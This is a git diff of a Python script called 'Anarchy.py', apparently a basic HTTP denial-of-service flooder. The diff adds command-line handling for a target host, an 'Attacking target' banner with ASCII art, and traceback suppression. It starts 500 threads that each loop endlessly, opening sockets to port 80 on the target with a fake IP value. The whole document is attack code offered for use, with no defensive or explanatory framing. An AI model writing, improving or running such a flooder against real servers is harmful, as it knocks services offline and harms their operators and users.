@@ -1,15 +1,48 @@
+# !/bin/python3
+import sys
 import socket
 import threading
+from datetime import datetime
 
-# Add the IP address of your target
-target = ''
-# Fake IP address
+# Fake IP address - simple way of displaying a fake IP
 fake_ip = ''
-# Port being targeted on the server
+
+# Port being targeted on the server - this needs to be changed within the codebase
 port = 80
 
-attack_num = 0
+# Hides debugging errors - comment out to see debugging info
+sys.tracebacklimit = 0
 
+# Define our target
+if len(sys.argv) == 2:
+    target = socket.gethostbyname(sys.argv[1])  # Translate hostname to IPv4
+else:
+    print("Invalid amount of arguments")
+    print("Syntax: python3 Anarchy.py <IP>")
+    print("Example: python3 Anarchy.py 127.0.0.1")
+
+# Displays terminal output (banner)
+print("-" * 50)
+print("Attacking target " + target)
+print("Time started: " + str(datetime.now()))
+print("-" * 50)
+print("""\
+⠀⠀⠀⠀⣠⣶⡾⠏⠉⠙⠳⢦⡀⠀⠀⠀⢠⠞⠉⠙⠲⡀
+⠀⠀⠀⣴⠿⠏⠀⠀⠀⠀⠀⠀ ⢳⡀⠀ ⡏⠀⠀⠀⠀⠀ ⢷
+⠀⠀⢠⣟⣋⡀⢀⣀⣀⡀⠀⣀⡀⣧⠀⢸⠀⠀⠀⠀⠀   ⡇
+⠀⠀⢸⣯⡭⠁⠸⣛⣟⠆⡴⣻⡲⣿⠀⣸ Anarchy ⡇
+⠀⠀⣟⣿⡭⠀⠀⠀⠀⠀⢱⠀⠀ ⣿⠀⢹⠀⠀⠀⠀⠀   ⡇
+⠀⠀⠙⢿⣯⠄⠀⠀⠀⢀⡀⠀⠀⡿⠀⠀⡇⠀⠀⠀⠀  ⡼
+⠀⠀⠀⠀⠹⣶⠆⠀⠀⠀⠀⠀⡴⠃⠀⠀⠘⠤⣄ ⣠ ⠞⠀
+⠀⠀⠀⠀⠀⢸⣷⡦⢤⡤⢤⣞⣁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⢀⣤⣴⣿⣏⠁⠀⠀⠸⣏⢯⣷⣖⣦⡀⠀⠀⠀⠀⠀⠀
+⢀⣾⣽⣿⣿⣿⣿⠛⢲⣶⣾⢉⡷⣿⣿⠵⣿⠀⠀⠀⠀⠀⠀
+⣼⣿⠍⠉⣿⡭⠉⠙⢺⣇⣼⡏⠀⠀⠀⣄⢸⠀⠀⠀⠀⠀⠀
+⣿⣿⣧⣀⣿.........⣀⣰⣏⣘⣆⣀⠀
+""")
+
+attack_num = 0
+# ANARCHY TIME
 def anarchy():
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -23,6 +56,7 @@ def anarchy():
         print(attack_num)
 
         s.close()
+
 # Loops entire attack on the server being targeted
 for i in range(500):
     thread = threading.Thread(target=anarchy)
